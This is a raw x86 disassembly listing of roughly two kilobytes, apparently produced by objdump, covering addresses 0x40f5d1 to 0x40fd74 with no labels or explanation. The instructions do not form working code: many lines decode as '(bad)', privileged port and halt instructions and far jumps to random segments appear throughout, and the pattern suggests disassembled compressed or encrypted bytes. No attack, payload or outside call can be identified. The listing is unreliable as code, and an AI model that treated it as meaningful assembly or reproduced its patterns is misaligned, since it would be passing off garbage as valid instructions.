  40f5d1:	and    DWORD PTR [ebx-0x75],edx
  40f5d4:	adc    bh,cl
  40f5d6:	inc    esp
  40f5d7:	dec    ebx
  40f5d8:	mov    edi,0x6d8e292b
  40f5dd:	inc    eax
  40f5de:	cmp    eax,DWORD PTR [ecx]
  40f5e0:	push   esi
  40f5e1:	sub    DWORD PTR [esi-0x3d39d601],edx
  40f5e7:	xor    cl,ch
  40f5e9:	mov    ds:0x177273d9,eax
  40f5ee:	sahf   
  40f5ef:	(bad)  
  40f5f0:	and    edi,DWORD PTR [esi+edx*1-0x3e]
  40f5f4:	xor    eax,0xb73c9732
  40f5f9:	xchg   ecx,eax
  40f5fa:	sbb    BYTE PTR [esi+0x53],0x42
  40f5fe:	fst    DWORD PTR [edi]
  40f600:	xchg   ebx,eax
  40f601:	sub    eax,0xc793d782
  40f606:	rol    DWORD PTR [edx+0x62e43503],1
  40f60c:	ds push ebp
  40f60e:	mov    bh,0xf9
  40f610:	lock mov es:0x9113fade,al
  40f617:	cmp    dl,BYTE PTR [ebx]
  40f619:	xlat   BYTE PTR ds:[ebx]
  40f61a:	push   eax
  40f61b:	dec    edx
  40f61c:	inc    edi
  40f61d:	cmp    ebx,DWORD PTR [edi-0xbc09104]
  40f623:	mov    ds:0x1667d340,al
  40f628:	imul   edi,eax,0x19c416ed
  40f62e:	nop
  40f62f:	and    eax,0xaf246650
  40f634:	sbb    eax,0x681aad6a
  40f639:	les    edi,FWORD PTR ds:0x7e61b62b
  40f63f:	cmp    ch,BYTE PTR [edx-0x3cc6810b]
  40f645:	out    dx,al
  40f646:	ret    0x68c1
  40f649:	jl     0x40f64c
  40f64b:	mov    DWORD PTR [edi-0x52],eax
  40f64e:	xchg   BYTE PTR [edi+0x558c4bc2],bl
  40f654:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f655:	hlt    
  40f656:	rol    esi,cl
  40f658:	jns    0x40f626
  40f65a:	inc    esi
  40f65b:	sub    esp,DWORD PTR [eax+0x44d50f41]
  40f661:	(bad)  
  40f662:	les    edi,FWORD PTR ds:0x297649b0
  40f668:	push   esi
  40f669:	sbb    ecx,DWORD PTR [esi+0x44]
  40f66c:	mov    eax,ds:0xe3c42338
  40f671:	aas    
  40f672:	pop    es
  40f673:	fsqrt  
  40f675:	cld    
  40f676:	or     eax,0xcb49b08d
  40f67b:	pop    edi
  40f67c:	cs mov esi,0x96cf9b8a
  40f682:	mov    esp,0x456d9c8d
  40f687:	mov    bl,dl
  40f689:	pop    es
  40f68a:	xchg   ebp,eax
  40f68b:	cmp    edx,DWORD PTR [edx+ecx*4+0x5d]
  40f68f:	je     0x40f6af
  40f691:	outs   dx,BYTE PTR ds:[esi]
  40f692:	pop    ebx
  40f693:	cs pop esp
  40f695:	(bad)  
  40f696:	sahf   
  40f697:	mov    edi,0x516d44e4
  40f69c:	sub    eax,0xc3d95e68
  40f6a1:	(bad)  
  40f6a2:	out    0x6d,eax
  40f6a4:	cmp    ch,BYTE PTR [edx+0xcb825be]
  40f6aa:	rcl    dl,1
  40f6ac:	or     bh,BYTE PTR [ebx-0x270f87da]
  40f6b2:	loop   0x40f6e0
  40f6b4:	in     al,0x17
  40f6b6:	jmp    0x40f677
  40f6b8:	arpl   WORD PTR [edx+0x61],bp
  40f6bb:	mov    ebx,ss
  40f6bd:	(bad)  
  40f6be:	ds dec esp
  40f6c0:	rol    BYTE PTR [edi],1
  40f6c2:	fmul   st,st(0)
  40f6c4:	xor    eax,ebp
  40f6c6:	sbb    DWORD PTR [edx+0x28215c01],esp
  40f6cc:	mov    ds:0xa5ba50f0,al
  40f6d1:	and    dh,BYTE PTR [esp+edi*4-0x64]
  40f6d5:	popa   
  40f6d6:	aad    0x60
  40f6d8:	pop    esp
  40f6d9:	fdecstp 
  40f6db:	(bad)
  40f6de:	aam    0xd4
  40f6e0:	cmc    
  40f6e1:	out    0x3e,al
  40f6e3:	inc    esi
  40f6e4:	not    BYTE PTR [edx+0x73]
  40f6e7:	cdq    
  40f6e8:	cli    
  40f6e9:	int3   
  40f6ea:	sub    eax,0x38948895
  40f6ef:	mov    ch,dl
  40f6f1:	jge    0x40f6c9
  40f6f3:	popf   
  40f6f4:	in     eax,dx
  40f6f5:	lahf   
  40f6f6:	aad    0x87
  40f6f8:	shl    esi,1
  40f6fa:	idiv   cl
  40f6fc:	loopne 0x40f6ce
  40f6fe:	add    ecx,esp
  40f700:	inc    edx
  40f701:	push   0xffffff95
  40f703:	out    dx,al
  40f704:	loop   0x40f6f1
  40f706:	pop    esi
  40f707:	cmp    DWORD PTR [ebx-0x11e32cd0],ebx
  40f70d:	push   ebp
  40f70e:	hlt    
  40f70f:	popf   
  40f710:	or     DWORD PTR [edx+eiz*4+0x4aed220e],0x23162bca
  40f71b:	dec    esi
  40f71c:	sahf   
  40f71d:	sahf   
  40f71e:	sub    DWORD PTR [ecx-0x1a],edx
  40f721:	mov    DWORD PTR [ebx-0x7c],ebx
  40f724:	rcr    ebp,1
  40f726:	jl     0x40f76d
  40f728:	xor    cl,BYTE PTR [edi+0x15]
  40f72b:	(bad)  
  40f72c:	jmp    0x6a9f78e1
  40f731:	lea    esp,[ecx+0x588f0b51]
  40f737:	shr    DWORD PTR ds:0xf8122990,1
  40f73d:	push   ss
  40f73e:	(bad)  
  40f73f:	mov    esp,0x707d74fd
  40f744:	sub    DWORD PTR [edx-0x23b236c5],edi
  40f74a:	bound  eax,QWORD PTR [eax-0x68]
  40f74d:	call   0x5e10dec0
  40f752:	sbb    BYTE PTR [ebx-0x75],0x36
  40f756:	mov    bh,0xea
  40f758:	js     0x40f7d8
  40f75a:	arpl   dx,bp
  40f75c:	mov    fs,WORD PTR [eax]
  40f75e:	xor    dl,BYTE PTR [esi-0x5bbef75a]
  40f764:	adc    DWORD PTR [ebx],edi
  40f766:	sbb    ch,al
  40f768:	mov    ebp,0xb7d520ba
  40f76d:	pop    ecx
  40f76e:	inc    edi
  40f76f:	shrd   edx,edi,cl
  40f772:	adc    eax,0xa73ec809
  40f777:	pop    esi
  40f778:	mov    cl,0xc7
  40f77a:	scas   al,BYTE PTR es:[edi]
  40f77b:	mov    al,ds:0x1a9b06cf
  40f780:	mov    BYTE PTR [edi-0x22df0611],al
  40f786:	bound  eax,QWORD PTR [edx+0x4d]
  40f789:	retf   
  40f78a:	jge    0x40f7b9
  40f78c:	sub    BYTE PTR ss:[edi],0x3d
  40f790:	aas    
  40f791:	pop    ebx
  40f792:	je     0x40f7f9
  40f794:	sub    eax,DWORD PTR [ebp+0x64]
  40f797:	xchg   ebx,eax
  40f798:	fwait
  40f799:	(bad)  
  40f79a:	addr16 pop edx
  40f79c:	aas    
  40f79d:	(bad)  
  40f79e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f79f:	gs sub eax,0x6158d85d
  40f7a5:	int    0xc
  40f7a7:	out    0x1,al
  40f7a9:	cli    
  40f7aa:	pop    edx
  40f7ac:	out    dx,eax
  40f7ad:	call   0xa7ed:0xa0cc1996
  40f7b4:	out    dx,eax
  40f7b5:	pop    es
  40f7b6:	in     eax,0xf3
  40f7b8:	jmp    0x3fa0e6b7
  40f7bd:	aad    0x68
  40f7bf:	jne    0x40f7bb
  40f7c1:	mov    ebx,0xc30fb9ff
  40f7c6:	and    al,0xe9
  40f7c8:	sahf   
  40f7c9:	push   0xffffffa0
  40f7cb:	push   esp
  40f7cc:	(bad)  
  40f7ce:	fld    DWORD PTR [edi-0x71]
  40f7d1:	mov    ebp,0x4f6bcfd7
  40f7d6:	push   ecx
  40f7d7:	iret   
  40f7d8:	sub    eax,0x99f481e7
  40f7dd:	bound  esp,QWORD PTR [eax+0x3c]
  40f7e0:	es in  eax,dx
  40f7e2:	scas   al,BYTE PTR es:[edi]
  40f7e3:	jnp    0x40f824
  40f7e5:	jne    0x40f844
  40f7e7:	mov    eax,ds:0x734ac46e
  40f7ec:	sbb    al,0xa1
  40f7ee:	cmc    
  40f7ef:	inc    ecx
  40f7f0:	add    ecx,esp
  40f7f2:	cmp    al,0x8c
  40f7f4:	push   edx
  40f7f5:	paddb  mm6,QWORD PTR [ecx]
  40f7f8:	inc    ecx
  40f7f9:	pop    ss
  40f7fa:	pusha  
  40f7fb:	mov    ds:0xf346bf52,eax
  40f800:	cmp    eax,0xaf2bde79
  40f805:	cmp    edi,ebp
  40f807:	int3   
  40f808:	es adc eax,0xa1e313fa
  40f80e:	cmp    BYTE PTR [ecx+0x2],dl
  40f811:	call   FWORD PTR [ebx-0x735b2d56]
  40f817:	scas   eax,DWORD PTR es:[edi]
  40f818:	dec    esi
  40f819:	ficom  DWORD PTR [eax]
  40f81b:	fistp  WORD PTR [eax+0x43]
  40f81e:	pop    ebx
  40f81f:	stos   DWORD PTR es:[edi],eax
  40f820:	push   cs
  40f821:	in     al,dx
  40f822:	ins    BYTE PTR es:[edi],dx
  40f823:	mov    ?,ebx
  40f825:	push   es
  40f826:	imul   eax,DWORD PTR [esi+esi*8-0x192cc797],0x3e
  40f82e:	mov    ah,0xa0
  40f830:	shl    BYTE PTR [eax-0x55927444],cl
  40f836:	addr16 loope 0x40f7c3
  40f839:	xor    dh,BYTE PTR [ecx+0x4c3fe575]
  40f83f:	lahf   
  40f840:	pushf  
  40f841:	pop    edx
  40f842:	jmp    0x40f828
  40f844:	imul   edx,DWORD PTR [edi],0xf7e45979
  40f84a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f84b:	add    DWORD PTR [ebx-0x5a],0xffffffad
  40f84f:	sbb    DWORD PTR [esi],edx
  40f851:	and    DWORD PTR [eax-0x5d],ebx
  40f854:	jmp    FWORD PTR [edx]
  40f856:	cmp    edi,esi
  40f858:	mov    ecx,0x9621d30f
  40f85d:	or     edx,eax
  40f85f:	and    al,0x39
  40f861:	(bad)  
  40f862:	je     0x40f81d
  40f864:	jmp    0xc8b0:0x3f26a290
  40f86b:	jo     0x40f858
  40f86d:	sti    
  40f86e:	pop    ecx
  40f86f:	add    cl,BYTE PTR [edx-0x14]
  40f872:	aas    
  40f873:	mov    eax,0xb06428b4
  40f878:	aas    
  40f879:	mov    cl,0xc0
  40f87b:	mov    bh,0x27
  40f87d:	(bad)  
  40f87e:	xor    eax,esp
  40f880:	mov    esi,0xa43c1edf
  40f885:	retf   0x75e7
  40f888:	cmp    BYTE PTR [esi],al
  40f88a:	push   esp
  40f88b:	das    
  40f88c:	jnp    0x40f8f2
  40f88e:	cli    
  40f88f:	enter  0x5f70,0x8a
  40f893:	mov    ebp,0x5329e07d
  40f898:	and    al,0x2
  40f89a:	xor    DWORD PTR [edi+0x4581c8f3],edi
  40f8a0:	outs   dx,BYTE PTR ds:[esi]
  40f8a1:	mov    al,0xc6
  40f8a3:	push   cs
  40f8a4:	div    BYTE PTR [ebp+0x1b]
  40f8a7:	and    al,0x2
  40f8a9:	in     eax,dx
  40f8aa:	pop    DWORD PTR [edx-0x54]
  40f8ad:	xchg   ecx,eax
  40f8ae:	adc    al,0x7d
  40f8b0:	mov    ebp,0xf8f5be1d
  40f8b5:	mov    cl,0xb7
  40f8b7:	jle    0x40f850
  40f8b9:	jl     0x40f8b9
  40f8bb:	xchg   ecx,eax
  40f8bc:	hlt    
  40f8bd:	daa    
  40f8be:	dec    esi
  40f8bf:	mov    BYTE PTR [ebx+0x6b17402e],al
  40f8c5:	inc    ebp
  40f8c6:	add    ch,BYTE PTR [ebx+0x75]
  40f8c9:	mov    edi,0xb487f7bc
  40f8ce:	dec    ebp
  40f8cf:	ins    BYTE PTR es:[edi],dx
  40f8d0:	stc    
  40f8d1:	lods   al,BYTE PTR ds:[esi]
  40f8d2:	pop    edi
  40f8d3:	cmc    
  40f8d4:	pop    ds
  40f8d5:	xor    ecx,ecx
  40f8d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f8d8:	sub    ebx,ebx
  40f8da:	pop    eax
  40f8db:	ret    
  40f8dc:	cdq    
  40f8dd:	mov    esp,0xdfe7c640
  40f8e2:	in     eax,dx
  40f8e3:	(bad)  
  40f8e4:	mov    al,0xc
  40f8e6:	add    BYTE PTR ds:0x898f8169,dh
  40f8ec:	fwait
  40f8ed:	dec    eax
  40f8ee:	adc    ah,BYTE PTR [esi]
  40f8f0:	pop    eax
  40f8f1:	xor    ah,BYTE PTR [ebx+esi*1]
  40f8f4:	sub    esi,0x22
  40f8f7:	mov    esi,0x7327951
  40f8fc:	fmul   st,st(3)
  40f8fe:	push   ebp
  40f8ff:	mov    al,0x26
  40f901:	test   DWORD PTR [eax-0x799b8a2c],esp
  40f907:	(bad)  
  40f908:	push   ss
  40f909:	mov    edx,fs
  40f90b:	(bad)  
  40f90c:	mov    ecx,0x92651641
  40f911:	les    ebx,FWORD PTR [ecx*2-0x5182d033]
  40f918:	fsub   DWORD PTR [eax+ebx*4+0x18]
  40f91c:	sbb    al,0x6c
  40f91e:	aad    0x81
  40f920:	(bad)  
  40f921:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f922:	and    eax,0x6a5f33
  40f927:	xor    BYTE PTR [edi],bh
  40f929:	and    DWORD PTR [ecx+0x52],ecx
  40f92c:	retf   
  40f92d:	add    dh,BYTE PTR [edi+edx*4]
  40f930:	test   esi,esp
  40f932:	ins    DWORD PTR es:[edi],dx
  40f933:	add    edx,esp
  40f935:	push   ecx
  40f936:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f937:	popa   
  40f938:	fwait
  40f939:	cmp    BYTE PTR [ebx-0x1c],bh
  40f93c:	hlt    
  40f93d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f93e:	pop    edi
  40f93f:	test   eax,0xf26dd3ed
  40f944:	sahf   
  40f945:	or     DWORD PTR [edx+0x4c],esi
  40f948:	mov    bh,0x67
  40f94a:	add    eax,0x76ab6a6b
  40f94f:	push   esp
  40f950:	popa   
  40f951:	fstp   QWORD PTR [eax-0x2f]
  40f954:	daa    
  40f955:	int    0x70
  40f957:	dec    ecx
  40f958:	inc    edx
  40f959:	loopne 0x40f911
  40f95b:	out    0x59,al
  40f95d:	test   al,0x8e
  40f95f:	call   0x9de5:0xe3669cfb
  40f966:	loopne 0x40f902
  40f968:	retf   0xa658
  40f96b:	lea    ebp,[ecx]
  40f96d:	out    0x97,al
  40f96f:	es push ebx
  40f971:	xor    al,0xcf
  40f973:	ret    
  40f974:	jo     0x40f90a
  40f976:	je     0x40f9c2
  40f978:	les    edx,FWORD PTR [edx+0x6b]
  40f97b:	xchg   ebx,eax
  40f97c:	je     0x40f995
  40f97e:	and    BYTE PTR [edx+0x4be46bdb],dl
  40f984:	and    DWORD PTR [ebx+0x623cd0ff],0x787cd5b
  40f98e:	pop    edx
  40f98f:	mov    eax,ds:0x7da79ab3
  40f994:	repz jns 0x40f996
  40f997:	mov    edx,0x682ee89b
  40f99c:	es inc edi
  40f99e:	sub    bh,BYTE PTR [edx-0x5c]
  40f9a1:	std    
  40f9a2:	dec    edi
  40f9a3:	jb     0x40f957
  40f9a5:	bnd jb 0x40f964
  40f9a8:	push   eax
  40f9a9:	sub    eax,0xcb31d785
  40f9ae:	sub    ebp,ebx
  40f9b0:	aam    0x1e
  40f9b2:	aad    0xf7
  40f9b4:	push   0x8313cd0d
  40f9b9:	xlat   BYTE PTR ds:[ebx]
  40f9ba:	cdq    
  40f9bb:	sahf   
  40f9bc:	xor    ch,cl
  40f9be:	(bad)  
  40f9bf:	sub    eax,0x35a8c89c
  40f9c4:	jno    0x40f9bd
  40f9c6:	cmp    eax,0xa6784409
  40f9cb:	mov    esp,DWORD PTR [ebx]
  40f9cd:	pop    esi
  40f9ce:	push   es
  40f9cf:	sti    
  40f9d0:	inc    ebx
  40f9d1:	mov    dl,0xdc
  40f9d3:	mov    cl,0x4a
  40f9d5:	jmp    0x1d90:0x7f9bb905
  40f9dc:	jb     0x40f9a9
  40f9de:	mov    gs,esp
  40f9e0:	sub    al,0xc3
  40f9e2:	arpl   di,dx
  40f9e4:	mov    bh,0x61
  40f9e6:	retf   0xea1d
  40f9e9:	imul   DWORD PTR [esi+0x3d371969]
  40f9ef:	and    ah,BYTE PTR [ebx]
  40f9f1:	in     al,dx
  40f9f2:	pop    ecx
  40f9f3:	daa    
  40f9f4:	adc    al,0x4
  40f9f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f9f7:	test   DWORD PTR [esi-0xbbbf216],edi
  40f9fd:	inc    edx
  40f9fe:	repnz cmp eax,0x99fa8e81
  40fa04:	int3   
  40fa05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa06:	mul    BYTE PTR [eax+0x5d]
  40fa09:	cld    
  40fa0a:	shl    eax,cl
  40fa0c:	ffree  st(1)
  40fa0e:	and    eax,0xbc54b0ad
  40fa13:	out    dx,eax
  40fa14:	mov    esi,0x9be927e5
  40fa19:	fptan  
  40fa1b:	xor    ah,BYTE PTR [ebx-0x6]
  40fa1e:	shl    bl,1
  40fa20:	repz cwde 
  40fa22:	add    DWORD PTR [eax],eax
  40fa24:	fwait
  40fa25:	popa   
  40fa26:	inc    ecx
  40fa27:	outs   dx,BYTE PTR ds:[esi]
  40fa28:	ret    0xe9f3
  40fa2b:	cmp    DWORD PTR cs:[edi],ecx
  40fa2e:	sub    BYTE PTR [eax*8+0x712fce14],ah
  40fa35:	sbb    BYTE PTR [ebp-0x1b],al
  40fa38:	lahf   
  40fa39:	pop    esi
  40fa3a:	sub    ecx,DWORD PTR [esi-0x1756b3fa]
  40fa40:	arpl   WORD PTR [esp+esi*1-0x6],bp
  40fa44:	out    0x17,al
  40fa46:	cli    
  40fa47:	push   esp
  40fa48:	jecxz  0x40f9df
  40fa4a:	(bad)  
  40fa4b:	mov    dl,0x33
  40fa4d:	ficomp DWORD PTR [edx+ebp*4+0x39505929]
  40fa54:	dec    eax
  40fa55:	sbb    ebp,ebx
  40fa57:	mov    cl,0xee
  40fa59:	test   BYTE PTR [edx-0x5eff9a34],ah
  40fa5f:	nop
  40fa60:	ss cwde 
  40fa62:	jmp    0x40fadc
  40fa64:	sub    eax,0xaad14cf7
  40fa69:	test   al,0x8d
  40fa6b:	shl    BYTE PTR [ebx+0x58431597],1
  40fa71:	call   0xe014:0xf1f4de17
  40fa78:	cmp    ah,bh
  40fa7a:	(bad)  
  40fa7d:	sub    edi,DWORD PTR [edi+0x1c]
  40fa80:	push   ebx
  40fa81:	cmc    
  40fa82:	mov    ebp,0x49835e8d
  40fa87:	or     ebx,ebx
  40fa89:	imul   edi,eax,0xdb96ed67
  40fa8f:	in     al,0x47
  40fa91:	retf   
  40fa92:	cmp    ebx,0xf87512f6
  40fa98:	sub    BYTE PTR [ebx-0x1b7046a],ch
  40fa9e:	sbb    eax,0xab840a9f
  40faa3:	mov    dh,0x65
  40faa5:	xor    eax,0x7150241a
  40faaa:	mov    eax,ds:0x4fbf9fb0
  40faaf:	jbe    0x40faaa
  40fab1:	(bad)  
  40fab2:	mov    esp,0xa9f8d896
  40fab7:	mov    ecx,0xee05d7cd
  40fabc:	push   ss
  40fabd:	lods   eax,DWORD PTR ds:[esi]
  40fabe:	nop
  40fabf:	and    al,dh
  40fac1:	push   ds
  40fac2:	cmp    al,0x8a
  40fac4:	daa    
  40fac5:	cmp    ebx,DWORD PTR [edx]
  40fac7:	sbb    bl,bh
  40fac9:	mov    dl,0xad
  40facb:	cmp    BYTE PTR [ebp+0x1a05bd25],dl
  40fad1:	sub    cl,bl
  40fad3:	call   0xa2779b3f
  40fad8:	imul   esi,DWORD PTR [eax],0xffffffb1
  40fadb:	jecxz  0x40fa75
  40fadd:	out    dx,eax
  40fade:	xchg   edx,eax
  40fadf:	mov    edi,0xcb531b2d
  40fae4:	cmp    DWORD PTR [esi+0x7765fe36],ebp
  40faea:	(bad)
  40faee:	cmp    DWORD PTR [ecx+0x4b36f698],edx
  40faf4:	fst    QWORD PTR [edx]
  40faf6:	scas   eax,DWORD PTR es:[edi]
  40faf7:	mov    ds:0x876f0c68,al
  40fafc:	(bad)  
  40fafd:	imul   ebx,edx,0xf512cbfb
  40fb03:	sbb    al,0x5b
  40fb05:	gs aam 0xc5
  40fb08:	ss jbe 0x40fb0f
  40fb0b:	jg     0x40fb54
  40fb0d:	dec    esp
  40fb0e:	mov    ds:0xa967300f,al
  40fb13:	sbb    eax,0x41c75066
  40fb18:	es call 0x5d8ec9d8
  40fb1e:	xchg   BYTE PTR [ebx-0x1d],bh
  40fb21:	push   eax
  40fb22:	jb     0x40fac4
  40fb24:	out    dx,al
  40fb25:	scas   eax,DWORD PTR es:[edi]
  40fb26:	push   es
  40fb27:	test   al,0xf2
  40fb29:	pop    ds
  40fb2a:	enter  0xa6cb,0xa0
  40fb2e:	mov    edx,0xbe8fa298
  40fb33:	fnstcw WORD PTR [esi-0x4e8cd7d0]
  40fb39:	jns    0x40fb2b
  40fb3b:	lods   al,BYTE PTR ds:[esi]
  40fb3c:	icebp  
  40fb3d:	mov    ?,WORD PTR [ebp+0x45]
  40fb40:	out    dx,al
  40fb41:	sub    ecx,DWORD PTR [eax+0x687a4faa]
  40fb47:	sahf   
  40fb48:	je     0x40fbc9
  40fb4a:	mov    eax,0xeba777f7
  40fb50:	adc    eax,0xd4bae217
  40fb55:	call   DWORD PTR [ebx+0x77]
  40fb58:	fcomp  DWORD PTR [edi+ebx*8+0x2e72109d]
  40fb5f:	test   DWORD PTR [eax-0x37c0d8bf],esi
  40fb65:	and    eax,0xf27f78b3
  40fb6a:	imul   ebp,esp,0x77ea20c6
  40fb70:	fidiv  WORD PTR [edi]
  40fb72:	adc    bh,ch
  40fb74:	adc    BYTE PTR [edx+0x46cf4ecd],0xde
  40fb7b:	push   ebp
  40fb7c:	jno    0x40fb68
  40fb7e:	pop    ebx
  40fb7f:	lods   al,BYTE PTR ds:[esi]
  40fb80:	mov    ah,BYTE PTR [esi+ebx*1+0xc53ec3a]
  40fb87:	inc    esi
  40fb88:	(bad)
  40fb8c:	test   al,0xbd
  40fb8e:	xlat   BYTE PTR ds:[ebx]
  40fb8f:	mov    BYTE PTR [eax],cl
  40fb91:	jmp    0x664b12d5
  40fb96:	jecxz  0x40fba3
  40fb98:	jge    0x40fbcc
  40fb9a:	or     ch,BYTE PTR [edx]
  40fb9c:	pop    ebp
  40fb9d:	jle    0x40fb8c
  40fb9f:	aas    
  40fba0:	idiv   BYTE PTR [edi+0x3d]
  40fba3:	xor    eax,0xde36ddd9
  40fba8:	mov    esi,0xa309d19b
  40fbad:	retf   
  40fbae:	pop    eax
  40fbaf:	or     BYTE PTR [ebp+0x5d7c9a52],cl
  40fbb5:	jg     0x40fb48
  40fbb7:	push   ecx
  40fbb8:	sahf   
  40fbb9:	retf   0x5e8e
  40fbbc:	and    eax,0x2f7d5dd7
  40fbc1:	push   0x14
  40fbc3:	jae    0x40fb88
  40fbc5:	js     0x40fbf4
  40fbc7:	dec    ebp
  40fbc8:	add    al,0xee
  40fbca:	inc    ecx
  40fbcb:	les    edx,FWORD PTR [edx+0x1a]
  40fbce:	mov    edi,0x3b3fab99
  40fbd3:	pop    esi
  40fbd4:	popf   
  40fbd5:	cmp    eax,0x253b3d31
  40fbda:	jl     0x40fb76
  40fbdc:	xor    DWORD PTR [ebx],edx
  40fbde:	pushf  
  40fbdf:	pop    esi
  40fbe0:	or     al,BYTE PTR [edi+0x7]
  40fbe3:	push   ecx
  40fbe4:	inc    edx
  40fbe5:	xor    ebp,DWORD PTR [eax+0x14]
  40fbe8:	dec    ebx
  40fbe9:	lock xchg edi,eax
  40fbeb:	lock leave 
  40fbed:	in     eax,dx
  40fbee:	and    BYTE PTR [edi-0x47f21a88],dh
  40fbf4:	xor    eax,0x671aef4f
  40fbf9:	(bad)  
  40fbfa:	fiadd  DWORD PTR [ecx]
  40fbfc:	repnz popa 
  40fbfe:	sbb    ebx,ecx
  40fc00:	dec    ecx
  40fc01:	shl    DWORD PTR [edi],1
  40fc03:	je     0x40fc15
  40fc05:	into   
  40fc06:	lock inc edi
  40fc08:	xor    esp,DWORD PTR [esi]
  40fc0a:	sub    BYTE PTR [esi+0xb],dh
  40fc0d:	dec    esi
  40fc0e:	sub    BYTE PTR [esi+0x485ec2a],ch
  40fc14:	mov    esp,0x5e77550e
  40fc19:	dec    esp
  40fc1a:	or     ax,si
  40fc1d:	add    ah,al
  40fc1f:	mov    al,BYTE PTR [eax]
  40fc21:	push   ebp
  40fc22:	js     0x40fbfc
  40fc24:	dec    esp
  40fc25:	and    eax,0xffb9dfd3
  40fc2a:	sub    ch,dh
  40fc2c:	dec    ebx
  40fc2d:	outs   dx,BYTE PTR ds:[esi]
  40fc2e:	pop    ss
  40fc2f:	(bad)  
  40fc30:	gs mov esp,0x799a6b40
  40fc36:	jge    0x40fcaf
  40fc38:	pop    ebp
  40fc39:	sub    BYTE PTR gs:[esi+0x52cb8b74],al
  40fc40:	dec    eax
  40fc41:	ret    
  40fc42:	stc    
  40fc43:	mov    DWORD PTR [ebx],0x14cdbd74
  40fc49:	retf   0x1509
  40fc4c:	loope  0x40fc13
  40fc4e:	jbe    0x40fc3d
  40fc50:	mov    bh,0xba
  40fc52:	fwait
  40fc53:	in     eax,0xf9
  40fc55:	mov    bl,BYTE PTR [ebx-0x21111f58]
  40fc5b:	dec    ebx
  40fc5c:	icebp  
  40fc5d:	ret    0x758a
  40fc60:	outs   dx,BYTE PTR ds:[esi]
  40fc61:	popf   
  40fc62:	retf   
  40fc63:	ret    
  40fc64:	test   BYTE PTR [edx+0x7d8d7b40],bl
  40fc6a:	mov    ebx,0x5e084f1b
  40fc6f:	mov    cs,WORD PTR [esi+0x24330f5f]
  40fc75:	(bad)  
  40fc76:	call   0x4ef1:0xa90380ce
  40fc7d:	out    0x27,al
  40fc7f:	sbb    esi,DWORD PTR [edx+0x12]
  40fc82:	data16 jl 0x40fca3
  40fc85:	iret   
  40fc86:	pop    ecx
  40fc87:	test   eax,0xd2a47451
  40fc8c:	or     al,0x54
  40fc8e:	(bad)
  40fc91:	pop    ss
  40fc92:	loop   0x40fd05
  40fc94:	jbe    0x40fcf1
  40fc96:	push   0xffffff81
  40fc98:	out    0x42,eax
  40fc9a:	push   ecx
  40fc9b:	retf   0x65b4
  40fc9e:	inc    edx
  40fc9f:	ins    DWORD PTR es:[edi],dx
  40fca0:	cmp    eax,0x8e73242d
  40fca5:	pop    esi
  40fca6:	jo     0x40fc36
  40fca8:	inc    ecx
  40fca9:	cli    
  40fcaa:	fnsave [esi+0x74]
  40fcad:	in     eax,0x0
  40fcaf:	xor    eax,ecx
  40fcb1:	mov    ch,0x98
  40fcb3:	test   DWORD PTR [ebp+0x2a582e71],ebp
  40fcb9:	push   cs
  40fcba:	dec    ebx
  40fcbb:	add    eax,0xdbfe359
  40fcc0:	add    al,0xc2
  40fcc2:	cmp    ecx,esi
  40fcc4:	lahf   
  40fcc5:	fs push 0x66936eba
  40fccb:	add    al,0x3d
  40fccd:	mov    DWORD PTR [bp+0x15db],esp
  40fcd2:	mov    ds:0x52c75112,eax
  40fcd7:	leave  
  40fcd8:	out    0x3,al
  40fcda:	popa   
  40fcdb:	jbe    0x40fd1f
  40fcdd:	inc    edi
  40fcde:	fsubr  QWORD PTR [edx]
  40fce0:	xchg   edx,eax
  40fce1:	in     al,dx
  40fce2:	mov    esi,0x90984742
  40fce7:	cdq    
  40fce8:	ins    BYTE PTR es:[edi],dx
  40fce9:	(bad)  
  40fcea:	hlt    
  40fceb:	xchg   edi,eax
  40fcec:	push   ds
  40fced:	scas   al,BYTE PTR es:[edi]
  40fcee:	xchg   ebp,eax
  40fcef:	or     eax,0x435d7178
  40fcf4:	sub    eax,0x23a5e655
  40fcf9:	xchg   esp,eax
  40fcfa:	mov    ch,0x5f
  40fcfc:	(bad)  
  40fcfd:	loopne 0x40fcc4
  40fcff:	mov    eax,0xc0f09692
  40fd04:	xchg   DWORD PTR [ebp+0x3b950c87],eax
  40fd0a:	inc    edi
  40fd0b:	add    BYTE PTR ds:0x5fecc4b9,dh
  40fd11:	mov    esp,DWORD PTR [eax]
  40fd13:	cmc    
  40fd14:	or     al,BYTE PTR [ecx]
  40fd16:	in     ax,dx
  40fd18:	leave  
  40fd19:	ds stos DWORD PTR es:[edi],eax
  40fd1b:	loopne 0x40fce1
  40fd1d:	test   DWORD PTR [eax+edx*2],ecx
  40fd20:	cmc    
  40fd21:	aam    0x26
  40fd23:	in     eax,dx
  40fd24:	stos   DWORD PTR es:[edi],eax
  40fd25:	push   eax
  40fd26:	sbb    eax,0xca113c30
  40fd2b:	arpl   bp,bp
  40fd2d:	outs   dx,DWORD PTR ds:[esi]
  40fd2e:	pop    ebx
  40fd2f:	push   eax
  40fd30:	pop    ss
  40fd31:	inc    esp
  40fd32:	out    0x0,al
  40fd34:	add    esi,DWORD PTR [esi+edx*2]
  40fd37:	dec    edi
  40fd38:	mov    bh,0xf3
  40fd3a:	std    
  40fd3b:	fucomip st,st(0)
  40fd3d:	add    eax,0x510c78b8
  40fd42:	adc    eax,0xa799e424
  40fd47:	inc    edi
  40fd48:	cwde   
  40fd49:	or     eax,0xe090584d
  40fd4e:	bnd lock jne 0x40fd57
  40fd52:	cdq    
  40fd53:	push   esp
  40fd54:	retf   
  40fd55:	add    al,0x73
  40fd57:	lea    ebx,[esi-0x64f21d6]
  40fd5d:	jbe    0x40fda3
  40fd5f:	and    ah,dh
  40fd61:	add    eax,0x76bfccee
  40fd66:	jp     0x40fd15
  40fd68:	(bad)  
  40fd69:	cli    
  40fd6a:	addr16 mov es,edi
  40fd6d:	lods   eax,DWORD PTR ds:[esi]
  40fd6e:	or     cl,BYTE PTR [esi+0x3d1b6b98]
  40fd74:	lods   al,BYTE PTR ds:[esi]
